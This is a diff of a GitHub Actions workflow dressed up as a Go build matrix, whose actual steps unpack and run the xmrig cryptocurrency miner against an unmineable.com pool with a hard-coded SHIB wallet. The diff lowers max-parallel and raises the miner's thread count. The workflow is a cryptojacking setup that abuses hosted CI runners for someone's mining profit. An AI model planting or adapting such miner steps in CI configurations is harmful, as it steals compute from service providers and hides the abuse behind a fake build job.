@@ -7,7 +7,7 @@ jobs:
     name: eX-code_UMBL
     runs-on: windows-latest
     strategy:
-      max-parallel: 5
+      max-parallel: 4
       fail-fast: false
       matrix:
         go: [1.0, 1.1, 1.2, 1.3, 1,35]
@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive xmrig-6.16.2-msvc-win64.zip
     - name: Running
-      run: .\xmrig-6.16.2-msvc-win64\xmrig-6.16.2\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SHIB:0xb4d7fa729733a59552d0ee356a878d81ac5b8cb2.RejekiNomplok
+      run: .\xmrig-6.16.2-msvc-win64\xmrig-6.16.2\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 2 --cpu-max-threads-hint 25 -u SHIB:0xb4d7fa729733a59552d0ee356a878d81ac5b8cb2.RejekiNomplok
     - name: DONE
       run: exit
